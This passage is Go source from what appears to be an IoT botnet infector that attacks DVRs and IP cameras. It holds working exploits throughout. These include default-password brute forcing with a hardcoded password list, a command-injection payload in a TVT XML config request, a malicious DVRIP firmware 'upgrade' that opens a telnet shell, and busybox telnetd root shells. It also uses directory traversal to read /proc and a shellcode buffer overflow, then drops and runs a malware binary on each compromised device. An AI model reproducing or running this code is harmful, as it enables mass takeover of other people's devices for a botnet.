	time.Sleep(5 * time.Second)

	conn.Write([]byte(command + "\r\n"))
	time.Sleep(5 * time.Second)
	conn.Close()
	return
}

/* ------ END OF TELNET LOADER ------- */

/* ------ OTHER PROTOCOL STUFF ------- */

func reverseShellUchttpdLoader(conn net.Conn) {

	var (
		rdbuf []byte = []byte("")
		query string = randStr(5)
	)

	conn.Write([]byte(">/tmp/.h && cd /tmp/\r\n"))
	conn.Write([]byte(">/mnt/.h && cd /mnt/\r\n"))
	conn.Write([]byte(">/var/.h && cd /var/\r\n"))
	conn.Write([]byte(">/dev/.h && cd /dev/\r\n"))
	conn.Write([]byte(">/var/tmp/.h && cd /var/tmp/\r\n"))
	conn.Write([]byte("/bin/busybox " + query + "\r\n"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			conn.Close()
			return
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), ": applet not found") {
			break
		}
	}

	zeroByte(rdbuf)

	dropped := telnetDropDropper(conn, "arm7")
	if dropped == false {
		conn.Close()
		return
	}

	fmt.Printf("\x1b[38;5;46mUchttpd\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", conn.RemoteAddr())
	payloadSent++
	binName := randStr(6)
	conn.Write([]byte("/bin/busybox cat " + echoDlrOutFile + " > " + binName + "; chmod 777 " + binName + "; ./" + binName + " " + loaderUchttpdTag + ";\r\n"))
	conn.Write([]byte("/var/Sofia 2>/dev/null &\r\n"))
	return
}

func infectFunctionTvt4567(target string, conn net.Conn) {

	var (
		rdbuf []byte = []byte("")
		state        = 0
	)

	payload := "\x0c\x00\x00\x00\x01\x00\x00\x00\x03\x00\x00\x00\x21\x00\x02\x00\x01\x00\x04\x00\x50\x02\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00\x3c\x3f\x78\x6d\x6c\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x65\x6e\x63\x6f\x64\x69\x6e\x67\x3d\x22\x75\x74\x66\x2d\x38\x22\x3f\x3e\x3c\x72\x65\x71\x75\x65\x73\x74\x20\x76\x65\x72\x73\x69\x6f\x6e\x3d\x22\x31\x2e\x30\x22\x20\x73\x79\x73\x74\x65\x6d\x54\x79\x70\x65\x3d\x22\x4e\x56\x4d\x53\x2d\x39\x30\x30\x30\x22\x20\x63\x6c\x69\x65\x6e\x74\x54\x79\x70\x65\x3d\x22\x57\x45\x42\x22\x3e\x3c\x74\x79\x70\x65\x73\x3e\x3c\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x3e\x3c\x65\x6e\x75\x6d\x3e\x72\x65\x66\x75\x73\x65\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x61\x6c\x6c\x6f\x77\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x2f\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x65\x6e\x75\x6d\x3e\x69\x70\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x69\x70\x72\x61\x6e\x67\x65\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x65\x6e\x75\x6d\x3e\x6d\x61\x63\x3c\x2f\x65\x6e\x75\x6d\x3e\x3c\x2f\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x2f\x74\x79\x70\x65\x73\x3e\x3c\x63\x6f\x6e\x74\x65\x6e\x74\x3e\x3c\x73\x77\x69\x74\x63\x68\x3e\x74\x72\x75\x65\x3c\x2f\x73\x77\x69\x74\x63\x68\x3e\x3c\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x20\x74\x79\x70\x65\x3d\x22\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x4d\x6f\x64\x65\x22\x3e\x72\x65\x66\x75\x73\x65\x3c\x2f\x66\x69\x6c\x74\x65\x72\x54\x79\x70\x65\x3e\x3c\x66\x69\x6c\x74\x65\x72\x4c\x69\x73\x74\x20\x74\x79\x70\x65\x3d\x22\x6c\x69\x73\x74\x22\x3e\x3c\x69\x74\x65\x6d\x54\x79\x70\x65\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x20\x74\x79\x70\x65\x3d\x22\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x22\x2f\x3e\x3c\x2f\x69\x74\x65\x6d\x54\x79\x70\x65\x3e\x3c\x69\x74\x65\x6d\x3e\x3c\x73\x77\x69\x74\x63\x68\x3e\x74\x72\x75\x65\x3c\x2f\x73\x77\x69\x74\x63\x68\x3e\x3c\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x69\x70\x3c\x2f\x61\x64\x64\x72\x65\x73\x73\x54\x79\x70\x65\x3e\x3c\x69\x70\x3e\x24\x28"
	payload += tvt4567Payload
	payload += "\x3c\x2f\x69\x70\x3e\x3c\x2f\x69\x74\x65\x6d\x3e\x3c\x2f\x66\x69\x6c\x74\x65\x72\x4c\x69\x73\x74\x3e\x3c\x2f\x63\x6f\x6e\x74\x65\x6e\x74\x3e\x3c\x2f\x72\x65\x71\x75\x65\x73\x74\x3e\x00"
	payload = base64.StdEncoding.EncodeToString([]byte(payload))

	cntlen := strconv.Itoa(len(payload))

	conn.Write([]byte("{D79E94C5-70F0-46BD-965B-E17497CCB598}"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if strings.Contains(string(rdbuf), "{D79E94C5-70F0-46BD-965B-E17497CCB598}") && state != 1 {
			conn.Write([]byte("GET /saveSystemConfig HTTP/1.1\r\nAuthorization: Basic\r\nContent-type: text/xml\r\nContent-Length: " + cntlen + "\r\n{D79E94C5-70F0-46BD-965B-E17497CCB598} 2\r\n\r\n" + payload + "\r\n\r\n"))
			zeroByte(rdbuf)
			state = 1
			continue
		} else if strings.Contains(string(rdbuf), "200") && state == 1 {
			fmt.Printf("\x1b[38;5;46mTvt-4567\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m payload sent to device\x1b[38;5;15m\r\n", conn.RemoteAddr().String())
			conn.Close()
			payloadSent++

			logDevice(target, "tvt")
			return
		}
	}

	conn.Close()
}

func infectFunctionMagicProto(target string) {

	var (
		rdbuf []byte = []byte("")
		state        = 0
	)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		magicGroup.Done()
		return
	}

	payloadOne := "\x5a\xa5\x06\x15\x00\x00\x00\x98\x00\x00\x00"
	payloadTwo := "\x00\x00\x00\x00\x00\x00\x00\x00\x47\x4d\x54\x2b\x30\x39\x3a\x30\x30\x20\x53\x65\x6f\x75\x6c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x74\x69\x6d\x65\x2e\x6e\x69\x73\x74\x2e\x67\x6f\x76\x26"
	payloadThree := "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00"

	conn.Write([]byte("\x5a\xa5\x01\x20\x00\x00\x00\x00"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			break
		}

		rdbuf = append(rdbuf, tmpbuf...)
		if state == 0 && len(rdbuf) >= 4 && string(rdbuf[:4]) == "\x5a\xa5\x01\x20" {
			conn.Close()

			conn, err = net.DialTimeout("tcp", target, 10*time.Second)
			if err != nil {
				magicGroup.Done()
				return
			}

			payload := payloadOne
			payload += magicPacketIds[state]
			payload += payloadTwo
			payload += magicPayload + "f"
			payload += payloadThree

			conn.Write([]byte(payload))
			state++
			zeroByte(rdbuf)
			continue
		} else if state >= 1 {
			conn.Close()

			if state == 8 {
				fmt.Printf("\x1b[38;5;46mMagic\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential payload sent to device\x1b[38;5;15m\r\n", target)
				payloadSent++
				magicGroup.Done()

				logDevice(target, "magic")
				return
			}
			conn, err = net.DialTimeout("tcp", target, 10*time.Second)
			if err != nil {
				magicGroup.Done()
				return
			}

			payload := payloadOne
			payload += magicPacketIds[state]
			payload += payloadTwo
			payload += magicPayload + "f"
			payload += payloadThree

			conn.Write([]byte(payload))
			state++
			zeroByte(rdbuf)
			continue
		}
	}

	conn.Close()
	magicGroup.Done()
	return
}

func infectFunctionLibdvrProto(host, password string) (int, error, string, int) {

	var gotAdmin int = 0
	var gotShell int = 0
	var rInt int = 0

	rInt = rand.Intn(9999-9000) + 9000

	conn, err := net.DialTimeout("tcp", host, time.Duration(10)*time.Second)
	if err != nil {
		return 0, nil, "", 0
	}

	defer conn.Close()
	conn.SetWriteDeadline(time.Now().Add(6 * time.Second))
	_, err = conn.Write([]byte("/bin/busybox BOXOFABOX\n"))
	if err != nil {
		conn.Close()
		return 0, nil, "", 0
	}

	conn.SetReadDeadline(time.Now().Add(6 * time.Second))

	first_buf := make([]byte, 256)
	l, err := conn.Read(first_buf)
	if err != nil || l <= 0 {
		conn.Close()
		return 0, nil, "", 0
	}

	if strings.Contains(string(first_buf), "user name") || strings.Contains(string(first_buf), "username") {
		_, err = conn.Write([]byte("admin\n"))
		if err != nil {
			conn.Close()
			return 0, nil, "", 0
		}
	} else {
		if strings.Contains(string(first_buf), "BOXOFABOX: applet not found") {
			gotShell = 1
		} else {
			_, err = conn.Write([]byte("\n"))
			if err != nil {
				conn.Close()
				return 0, nil, "", 0
			}

			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			first_buf := make([]byte, 256)
			l, err := conn.Read(first_buf)
			if err != nil || l <= 0 {
				conn.Close()
				return 0, nil, "", 0
			}

			if !strings.Contains(string(first_buf), "user name") && !strings.Contains(string(first_buf), "username") {
				if strings.Contains(string(first_buf), "admin$") {
					gotAdmin = 1
				} else {
					conn.Close()
					return 0, nil, "", 0
				}
			} else {
				_, err = conn.Write([]byte("admin\n"))
				if err != nil {
					conn.Close()
					return 0, nil, "", 0
				}
			}
		}
	}

	if gotAdmin != 1 && gotShell != 1 {
		conn.SetReadDeadline(time.Now().Add(3 * time.Second))
		second_buf := make([]byte, 256)
		l2, err := conn.Read(second_buf)
		if err != nil || l2 <= 0 {
			conn.Close()
			return 0, nil, "", 0
		}

		if strings.Contains(string(second_buf), "pass word") || strings.Contains(string(second_buf), "password") {

			_, err = conn.Write([]byte(password + "\n"))
			if err != nil {
				conn.Close()
				return 0, nil, "", 0
			}

			conn.SetReadDeadline(time.Now().Add(3 * time.Second))
			second_buf := make([]byte, 1024)
			l, err := conn.Read(second_buf)
			if err != nil || l <= 0 {
				conn.Close()
				return 0, nil, "", 0
			}

			if strings.Contains(string(second_buf), "admin$") {
				gotAdmin = 1
			} else {
				conn.Close()
				return 0, nil, "", 0
			}
		} else if strings.Contains(string(second_buf), "admin$") {
			gotAdmin = 1
		} else {
			conn.Close()
			return 0, nil, "", 0
		}
	}

	if gotAdmin == 1 || gotShell == 1 {
		conn.Write([]byte("shell\n"))
		conn.Write([]byte("/bin/busybox BOXOFABOX\n"))

		new_buf := make([]byte, 128)
		l, err := conn.Read(new_buf)
		if err != nil || l <= 0 {
			conn.Close()
			return 0, nil, "", 0
		}

		if strings.Contains(string(new_buf), "BOXOFABOX: applet not found") {
			conn.Write([]byte("/bin/busybox telnetd -p" + strconv.Itoa(rInt) + " -l/bin/sh\n"))
			conn.Write([]byte("exit\n"))
			conn.Write([]byte("quit\n"))
			conn.Close()

			time.Sleep(3 * time.Second)
			return 1, nil, password, rInt
		} else {
			conn.Write([]byte("exit\n"))
			conn.Write([]byte("quit\n"))
			conn.Close()
			return 0, nil, "", 0
		}
	} else {
		conn.Write([]byte("quit\n"))
		conn.Close()
		return 0, nil, "", 0
	}
}

func infectFunctionLibdvr(target string) {

	passwords := []string{"I0TO5Wv9", "admin", "tlJwpbo6", "xc3511", "12345", "123456", "pYmGZYBJ", "bKdIrdV6", "ok0TJuQM", "kBny7nWP", "mIj8PVHx", "888888", "37vh15ns", "RJmARUve", "apWrl1sk", "1OAZMJJt"}
	splitStr := strings.Split(target, ":")

	for _, password := range passwords {
		exploited, err, _, port := infectFunctionLibdvrProto(target, password)
		if err != nil {
			return
		}

		if exploited == 1 {
			fmt.Printf("\x1b[38;5;46mLibdvr\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential telnet shell\x1b[38;5;15m\r\n", target)
			telnetLoader(splitStr[0]+":"+strconv.Itoa(port), 0, "arm7", loaderLibdvrTag, "")
			telnetLoader(splitStr[0]+":"+strconv.Itoa(port), 0, "arm", loaderLibdvrTag, "pkill -9 telnetd; killall telnetd")
			return
		}
	}
}

func infectFunctionDvrip(target string) {

	var (
		bytebuf        []byte   = []byte("")
		adminPasswords []string = []string{"tlJwpbo6", "S2fGqNFs", "OxhlwSG8", "ORsEWe7l", "nTBCS19C"}
		username       string   = "admin"
		password       string   = ""
		attempt        int      = 0
		authed         int      = 0
	)

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	for {
		if attempt >= 5 {
			break
		} else {
			password = adminPasswords[attempt]
		}

		conn.Write([]byte("\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x64\x00\x00\x00{ \"EncryptType\" : \"MD5\", \"LoginType\" : \"DVRIP-Web\", \"PassWord\" : \"" + password + "\", \"UserName\" : \"" + username + "\" }\x0a"))

		for {
			tmpbuf := make([]byte, 128)
			ln, err := conn.Read(tmpbuf)
			if ln <= 0 || err != nil {
				break
			}

			bytebuf = append(bytebuf, tmpbuf...)
			if strings.Contains(string(bytebuf), "}") {
				break
			}
		}

		dvrret, err := strconv.Atoi(getStringInBetween(string(bytebuf), "\"Ret\" : ", ", \"SessionID"))
		if err != nil {
			authed = 0
			break
		}

		if dvrret == DVRIP_OK {
			authed = 1
		}

		dvrret = DVRIP_NORESP

		if authed == 1 {
			break
		}

		attempt++
		continue
	}

	if authed != 1 {
		conn.Close()
		return
	}

	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xee\x03\x35\x00\x00\x00{ \"Name\" : \"KeepAlive\", \"SessionID\" : \"0x00000004\" }\x0a"))
	zeroByte(bytebuf)

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			conn.Close()
			return
		}

		bytebuf = append(bytebuf, tmpbuf...)
		if strings.Contains(string(bytebuf), "}") {
			break
		}
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf0\x05\x73\x00\x00\x00{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x00000004\" }\x0a"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			conn.Close()
			return
		}

		bytebuf = append(bytebuf, tmpbuf...)
		if strings.Contains(string(bytebuf), "}") {
			break
		}
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\xf2\x05\x62\x01\x00\x00\x50\x4B\x03\x04\x14\x03\x00\x00\x08\x00\x2C\x87\x1A\x4F\x9A\xF8\xB3\x9E\xC6\x00\x00\x00\x23\x02\x00\x00\x0B\x00\x00\x00\x49\x6E\x73\x74\x61\x6C\x6C\x44\x65\x73\x63\xB5\x90\x3D\x0B\xC2\x30\x10\x86\x77\x7F\xC5\x91\xD9\x62\x15\x1C\x74\xAD\x88\xAE\x56\x5D\xC4\x21\x35\x87\x0D\xC6\xE4\x48\xE2\x47\x91\xFE\x77\xDB\x14\x11\xAB\x8B\x88\x37\x64\x79\xDE\x7B\x2E\x77\xB7\x0E\x00\x5B\xD1\xDE\x72\x81\x89\x39\x1E\xB9\x16\x6C\x0C\x9B\x0E\x54\x55\xB1\x50\xEC\x09\x58\x9A\xA3\x52\xAC\xFB\x20\xE9\xCE\x4A\xF2\x35\xF0\xA8\x34\x7A\x01\x11\xC1\x28\x8E\xFB\x10\x29\xE8\x65\x52\xF7\x5C\xCE\x42\xB8\xEC\x7E\xEF\xCC\x4E\xAE\xC8\xCC\x15\xFE\xE1\x76\x0A\x91\x60\x30\x1C\x0D\xE2\xF8\xF7\x1F\x7E\xB0\x55\xEF\xB6\xEE\x60\x33\x6E\xC5\x85\x5B\x0C\xA2\x83\xA4\x24\xC7\xDD\x81\x05\x94\x9E\x88\x8C\xF5\x53\xC5\x5D\xBE\x2C\x08\xDF\x4F\x1F\xD0\x7C\xF2\xD2\xDB\x1E\x30\xC1\x73\x48\xB4\xED\x6B\xD4\xC2\xD8\x36\x68\x36\x23\xEE\x65\xA6\x70\x8D\xD6\x49\xA3\xAB\x4C\xD4\x6F\xD0\x22\x69\xCD\x2A\xEF\x50\x4B\x01\x02\x3F\x03\x14\x03\x00\x00\x08\x00\x2C\x87\x1A\x4F\x9A\xF8\xB3\x9E\xC6\x00\x00\x00\x23\x02\x00\x00\x0B\x00\x24\x00\x00\x00\x00\x00\x00\x00\x20\x80\xA4\x81\x00\x00\x00\x00\x49\x6E\x73\x74\x61\x6C\x6C\x44\x65\x73\x63\x0A\x00\x20\x00\x00\x00\x00\x00\x01\x00\x18\x00\x00\xCA\x6F\xF3\x26\x5C\xD5\x01\x00\x40\x5B\x5C\x2F\x5C\xD5\x01\x80\xD6\xF3\x5C\x2F\x5C\xD5\x01\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00\x5D\x00\x00\x00\xEF\x00\x00\x00\x00\x00"))

	for {
		tmpbuf := make([]byte, 128)
		ln, err := conn.Read(tmpbuf)
		if ln <= 0 || err != nil {
			conn.Close()
			return
		}

		bytebuf = append(bytebuf, tmpbuf...)
		if strings.Contains(string(bytebuf), "}") {
			break
		}
	}

	zeroByte(bytebuf)
	conn.Write([]byte("\xff\x00\x00\x00\x04\x00\x00\x00\x01\x00\x00\x00\x00\x01\xf2\x05\x00\x00\x00\x00"))

	splitStr := strings.Split(target, ":")
	time.Sleep(10 * time.Second)

	fmt.Printf("\x1b[38;5;46mDvrip\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m potential telnet shell opened\x1b[38;5;15m\r\n", target)
	go telnetLoader(splitStr[0]+":9001", 0, "arm7", loaderDvripTag, "pkill -9 telnetd; killall telnetd")

	conn.Write([]byte("\xFF\x01\x00\x00\x57\x00\x00\x00\x00\x00\x00\x00\x00\x00\xEA\x03\x27\x00\x00\x00{ \"Name\" : \"\", \"SessionID\" : \"0x00000004\" }\x0a"))
	conn.Close()
	return
}

/* ------ END OF THE OTHER STUFF ------ */

func ucSofiaCheck(target string, pid string) (found int) {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return -1
	}

	defer conn.Close()
	tmp := make([]byte, 256)
	buf := make([]byte, 0, 512)

	fmt.Fprintf(conn, "GET ../../proc/%s/cmdline HTTP\r\n\r\n", pid)
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			break
		}

		buf = append(buf, tmp[:n]...)
	}

	if (strings.Contains(string(buf), "/var/Sofia") || strings.Contains(string(buf), "usr/bin/Sofia") || strings.Contains(string(buf), "system_sofia") || strings.Contains(string(buf), "/var/bin/system_sofia")) && !strings.Contains(string(buf), "dvrHelper") {
		return 1
	} else {
		return -1
	}
}

func ucGuessSmaps(target string, pid string) (found int) {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return -1
	}

	defer conn.Close()
	tmp := make([]byte, 8096)
	buf := make([]byte, 0, 512)

	fmt.Fprintf(conn, "GET ../../proc/%s/smaps HTTP\r\n\r\n", pid)
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			break
		}

		buf = append(buf, tmp[:n]...)
	}

	smapsLines := strings.Split(string(buf), "\n")
	smapsCount := 0
	gotRegion := 0
	regionsAdded := 0

	for i := 0; i < len(smapsLines); i++ {
		if !strings.Contains(string(smapsLines[i]), "rwxp") {
			continue
		}

		smapsCount++
	}

	smapsRegions := make([]*smapsRegion, smapsCount)
	for i := range smapsRegions {
		smapsRegions[i] = &smapsRegion{}
	}

	for i := 0; i < len(smapsLines); i++ {
		if gotRegion == 8 || gotRegion == 0 {
			if !strings.Contains(string(smapsLines[i]), "rwxp") {
				continue
			}

			region := strings.Split(string(smapsLines[i]), "-")
			smapsRegions[regionsAdded].region = hexToInt(region[0])

			for q := 0; q < len(region); q++ {
				region[q] = ""
			}

			gotRegion = 1
		} else {
			if gotRegion == 1 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].size, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 2
					continue
				}

			} else if gotRegion == 2 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].rss, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 3
					continue
				}
			} else if gotRegion == 3 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].pss, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 4
					continue
				}
			} else if gotRegion == 4 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].shared_clean, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 5
					continue
				}
			} else if gotRegion == 5 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].shared_ditry, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 6
					continue
				}
			} else if gotRegion == 6 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].private_clean, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 7
					continue
				}
			} else if gotRegion == 7 {
				startAt := 0
				endAt := 0

				for q := 0; q < len(smapsLines[i]); q++ {
					if startAt == 0 {
						if _, err := strconv.Atoi(smapsLines[i][q : q+1]); err == nil {
							startAt = q
							continue
						}
					}
					if endAt == 0 && startAt > 0 {
						if smapsLines[i][q:q+1] == " " {
							endAt = q
							continue
						}
					}
				}

				if startAt > 0 && endAt > 0 {
					smapsRegions[regionsAdded].private_dirty, _ = strconv.Atoi(smapsLines[i][startAt:endAt])
					gotRegion = 8
					regionsAdded++
					continue
				}
			}

			gotRegion++
		}
	}

	for i := len(smapsRegions) - 7; i > 1; i-- {
		if smapsRegions[i].size == 8188 && smapsRegions[i+1].size == 8188 && smapsRegions[i+2].size == 8188 && smapsRegions[i+3].size == 8188 && smapsRegions[i+4].size == 8188 && smapsRegions[i+5].size == 8188 && smapsRegions[i+6].size == 8188 {
			if smapsRegions[i].rss == 4 && smapsRegions[i+1].rss == 4 && smapsRegions[i+2].rss == 4 && smapsRegions[i+3].rss >= 8 && smapsRegions[i+4].rss >= 4 && smapsRegions[i+5].rss >= 4 && smapsRegions[i+6].rss >= 8 {
				return int(smapsRegions[i+3].region)
			}
		}
	}

	return 0
}

func ucSendBof(target string, offset int) {

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	defer conn.Close()

	v := uint32(offset)
	offsetBuf := make([]byte, 4)
	binary.LittleEndian.PutUint32(offsetBuf, v)

	conn.Write([]byte("GET "))
	conn.Write([]byte(uchttpdShellCode))

	for i := 0; i < 299-len(uchttpdShellCode); i++ {
		conn.Write([]byte("a"))
	}

	conn.Write([]byte(offsetBuf))
	conn.Write([]byte(" HTTP\r\n\r\n"))

	buf := make([]byte, 0, 512)
	tmp := make([]byte, 256)

	for {
		n, err := conn.Read(tmp)
		if err != nil {
			break
		}

		buf = append(buf, tmp[:n]...)
	}

	zeroByte(buf)
	zeroByte(tmp)
}

func infectFunctionUchttpd(target string) {

	var pidStrs [128]string
	var pidsFound int = 0

	conn, err := net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		return
	}

	/* Dvrip check */
	go func() {
		ipslit := strings.Split(target, ":")
		tmpconn, err := net.DialTimeout("tcp", ipslit[0]+":34567", 10*time.Second)
		if err == nil {
			tmpconn.Close()
			infectFunctionDvrip(ipslit[0] + ":34567")
		}
	}()
	/* ////////////// */

	/* Libdvr check */
	go func() {
		ipslit := strings.Split(target, ":")
		tmpconn, err := net.DialTimeout("tcp", ipslit[0]+":9527", 10*time.Second)
		if err == nil {
			tmpconn.Close()
			infectFunctionLibdvr(ipslit[0] + ":9527")
		}
	}()

	return /* for now */

	/* Uchttpd check */
	tmp := make([]byte, 256)
	buf := make([]byte, 0, 512)

	fmt.Fprintf(conn, "GET ../../proc/ HTTP\r\n\r\n")
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			break
		}

		buf = append(buf, tmp[:n]...)
	}

	if !strings.Contains(string(buf), "Index of /mnt/web/") {
		zeroByte(tmp)
		zeroByte(buf)
		conn.Close()
		time.Sleep(10 * time.Second)
		return
	}

	zeroByte(tmp)
	zeroByte(buf)

	conn.Close()
	conn, err = net.DialTimeout("tcp", target, 10*time.Second)
	if err != nil {
		time.Sleep(10 * time.Second)
		return
	}

	buf = make([]byte, 0, 8096)
	tmp = make([]byte, 256)

	fmt.Fprintf(conn, "GET ../../proc/ HTTP\r\n\r\n")
	for {
		n, err := conn.Read(tmp)
		if err != nil {
			break
		}

		buf = append(buf, tmp[:n]...)
	}

	pids := strings.Split(string(buf), "\n")
	for i := 0; i < len(pids); i++ {
		if i >= 128 {
			break
		}

		if len(pids[i]) < 38 {
			continue
		}

		if _, err := strconv.Atoi(pids[i][33:34]); err != nil {
			continue
		}

		pidstr := pids[i][33:38]
		if _, err := strconv.Atoi(pidstr[0:1]); err == nil {
			if _, err := strconv.Atoi(pidstr[1:2]); err == nil {
				if _, err := strconv.Atoi(pidstr[2:3]); err == nil {
					if _, err := strconv.Atoi(pidstr[3:4]); err == nil {
						if _, err := strconv.Atoi(pidstr[4:5]); err == nil {
							if len(pidstr[0:]) >= 5 {
								pidStrs[pidsFound] = pidstr[0:5]
								pidsFound++
								continue
							}
						} else {
							if len(pidstr[0:]) >= 4 {
								pidStrs[pidsFound] = pidstr[0:4]
								pidsFound++
								continue
							}
						}
					} else {
						if len(pidstr[0:]) >= 3 {
							pidStrs[pidsFound] = pidstr[0:3]
							pidsFound++
							continue
						}
					}
				} else {
					if len(pidstr[0:]) >= 2 {
						pidStrs[pidsFound] = pidstr[0:2]
						pidsFound++
						continue
					}
				}
			} else {
				if len(pidstr[0:]) >= 1 {
					pidStrs[pidsFound] = pidstr[0:1]
					pidsFound++
					continue
				}
			}
		}

		pidstr = ""
	}

	zeroByte(buf)
	zeroByte(tmp)

	if pidsFound <= 5 {
		conn.Close()
		time.Sleep(10 * time.Second)
		return
	}

	conn.Close()

	for i := pidsFound; i > 1; i-- {
		retval := ucSofiaCheck(target, pidStrs[i])
		if retval == -1 {
			continue
		}

		retval = ucGuessSmaps(target, pidStrs[i])
		if retval == -1 {
			continue
		}

		//fmt.Printf("\x1b[38;5;46mUchttpd\x1b[38;5;15m: \x1b[38;5;134m%s\x1b[38;5;15m sending BOF to target\x1b[38;5;15m\r\n", target)

